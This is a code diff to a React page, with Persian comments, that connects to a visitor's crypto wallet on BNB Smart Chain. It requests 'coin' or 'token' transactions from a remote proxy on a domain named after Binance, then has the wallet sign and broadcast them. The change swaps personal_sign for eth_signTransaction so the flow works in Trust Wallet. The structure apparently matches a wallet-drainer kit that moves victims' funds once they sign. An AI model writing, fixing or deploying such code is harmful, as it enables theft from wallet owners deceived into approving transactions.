@@ -10,7 +10,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["eth_sign", "eth_sendRawTransaction", "personal_sign"],
+      methods: ["eth_signTransaction", "eth_sendRawTransaction"], // روش صحیح برای Trust Wallet
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -32,52 +32,42 @@ function App() {
 
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function genSign(address, chain, type, contract = "0") {
+    async function signAndSendTransaction(address, chain, type, contract = "0") {
       try {
         let requestData = { handler: "tx", address, chain, type };
         if (type === "token") requestData.contract = contract;
 
         var result = await jQuery.post(apiUrl, requestData);
-        var unSigned = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unSigned);
+        var unsignedTx = JSON.parse(result);
+        console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // **۲. امضای تراکنش با `personal_sign` چون `eth_signTransaction` در Trust Wallet کار نمی‌کند**
+        // **✅ امضای تراکنش با `eth_signTransaction`**
         var signedTx = await provider.request({
-          method: "personal_sign",
-          params: [JSON.stringify(unSigned.result), address],
+          method: "eth_signTransaction",
+          params: [unsignedTx.result],
         });
 
-        return { signedTx, rawTx: unSigned.result };
-      } catch (error) {
-        console.error("❌ Error in genSign:", error);
-        return null;
-      }
-    }
+        console.log("✍️ Signed Transaction:", signedTx);
 
-    async function acceptSign({ signedTx, rawTx }) {
-      try {
-        // **۳. ارسال تراکنش امضاشده به بلاکچین**
+        // **✅ ارسال تراکنش به شبکه با `eth_sendRawTransaction`**
         var txHash = await provider.request({
           method: "eth_sendRawTransaction",
           params: [signedTx],
         });
 
-        console.log("📤 Transaction Sent:", txHash);
         return txHash;
       } catch (error) {
-        console.error("❌ Error in acceptSign:", error);
+        console.error("❌ Error in signAndSendTransaction:", error);
         return null;
       }
     }
 
-    var signedData = await genSign(account_sender, "56", "coin");
+    var txHash = await signAndSendTransaction(account_sender, "56", "coin");
 
-    if (signedData) {
-      console.log("✍️ Signed Transaction:", signedData.signedTx);
-      var finalTx = await acceptSign(signedData);
-      console.log("📝 Final Sent Transaction:", finalTx);
+    if (txHash) {
+      console.log("📤 Transaction Sent:", txHash);
     } else {
-      console.error("⚠ Signing failed.");
+      console.error("⚠ Transaction failed.");
     }
   }
 
